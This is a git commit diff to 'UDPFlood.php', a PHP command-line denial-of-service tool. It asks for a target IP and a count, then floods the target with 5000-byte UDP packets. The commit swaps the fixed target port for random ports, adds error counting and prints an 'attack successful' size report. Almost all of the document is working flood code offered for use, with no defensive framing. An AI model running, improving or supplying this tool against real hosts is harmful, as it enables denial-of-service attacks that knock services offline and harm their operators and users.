56f2cf6be1a2d558a272a6a15cb75bbffa4bd2af
towa0131 <towa.towa0131@icloud.com>
2017-08-09 18:58:37 +0000

    Remove port option

--- UDPFlood/UDPFlood.php
+++ UDPFlood/UDPFlood.php
@@ -5,49 +5,51 @@ namespace UDPFlood {
 	$running = true;
 	$msg = str_repeat("\x00", 5000);
 	$attackcount = 0;
+	$error = 0;
+
 	echo "\x1b[38;5;145mAttack IP: ";
 	$ip = trim(fgets(STDIN));
 	
-	echo "\x1b[38;5;145mAttack Port: ";
-	$port = trim(fgets(STDIN));
-	
-	while(!is_numeric($port)){
-		echo "\x1b[38;5;124mError: It's not a valid number.\n";
-		echo "\x1b[38;5;145mAttack Port: ";
-		$port = trim(fgets(STDIN));
-	}
 	echo "\x1b[38;5;145mAttack count: ";
 	$count = trim(fgets(STDIN));
 	
 	while(!is_numeric($count)){
-		echo "\x1b[38;5;124mError: It's not a valid number.\n";
-		echo "\x1b[38;5;145mAttack Port: ";
+		echo "\x1b[38;5;124mError: It's not a valid number" . PHP_EOL;
+		echo "\x1b[38;5;145mAttack count: ";
 		$count = trim(fgets(STDIN));
 	}
 	
-	echo "\x1b[38;5;37mUDPFlood Started!\n";
+	echo "\x1b[38;5;37mUDPFlood Started!" . PHP_EOL;
 	
 	while(true){
 		//usleep(100000);
+		$port = mt_rand(1,65000);
 		
 		if($attackcount >= $count){
-			echo "\x1b[38;5;37mAttack successful!\n\x1b[m";
+			echo "\x1b[38;5;37mAttack successful! " . round(($attackcount*65)/1024, 2) . " MB packets sended." . PHP_EOL . "\x1b[m";
 			$running = false;
 		}
 		
-		if(!$running){
+		if($error >= 10){
+			echo "\x1b[38;5;124msome errors" . PHP_EOL . "\x1b[m";
 			exit(1);
+		}
+		
+		if(!$running){
+			exit(0);
 		}
 		
 		$fp = @fsockopen('udp://'.$ip, $port, $errno, $errstr, 30);
 		if(!$fp) {
-			echo "\x1b[38;5;124mUDP socket error: ".$errstr."\n";
+			echo "\x1b[38;5;124mUDP socket error: " . $errstr . PHP_EOL;
+			$error++;
 			continue;
 		}
 		if(!@fwrite($fp, $msg)){
-			echo "\x1b[38;5;19mData send error\n";
+			echo "\\x1b[38;5;124mData send error" . PHP_EOL;
+			$error++;
 		}else {
-			echo "\x1b[38;5;83mData send success!\n";
+			echo "\x1b[38;5;83mData send success!" . PHP_EOL;
 		}
 		@fclose($fp);
 		$attackcount++;
